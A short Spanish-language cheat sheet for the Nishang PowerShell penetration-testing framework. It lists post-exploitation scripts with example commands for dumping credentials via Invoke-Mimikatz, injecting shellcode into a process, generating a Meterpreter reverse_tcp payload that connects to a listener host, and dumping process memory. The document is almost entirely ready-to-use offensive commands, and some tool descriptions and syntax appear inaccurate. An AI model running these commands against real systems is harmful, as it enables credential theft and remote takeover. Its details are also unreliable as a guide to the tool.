### **Frameworks/Nishang/nishang.md**

# Nishang

## Descripción

`Nishang` es un framework de scripts de PowerShell diseñados para pruebas de penetración y tareas de post-explotación. Incluye una variedad de scripts para explotación, generación de payloads y evasión de detección.

## Uso

```powershell
Import-Module Nishang.psm1
```

### Scripts principales

- `Invoke-Mimikatz`: Extrae credenciales desde la memoria.
- `Invoke-Shellcode`: Inyecta y ejecuta shellcode en procesos.
- `Invoke-PowerDump`: Dumba la memoria de procesos específicos.
- `Invoke-Payload`: Genera payloads personalizados.

## Ejemplos

- **Extraer credenciales con Mimikatz:**
  
  ```powershell
  Invoke-Mimikatz -DumpCreds
  ```

- **Inyectar shellcode en un proceso:**
  
  ```powershell
  Invoke-Shellcode -Shellcode <hex_shellcode> -ProcessName notepad
  ```

- **Generar un payload inverso:**
  
  ```powershell
  Invoke-Payload -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.100 -Lport 4444
  ```

- **Dumpear memoria de un proceso:**
  
  ```powershell
  Invoke-PowerDump -ProcessName explorer
  ```

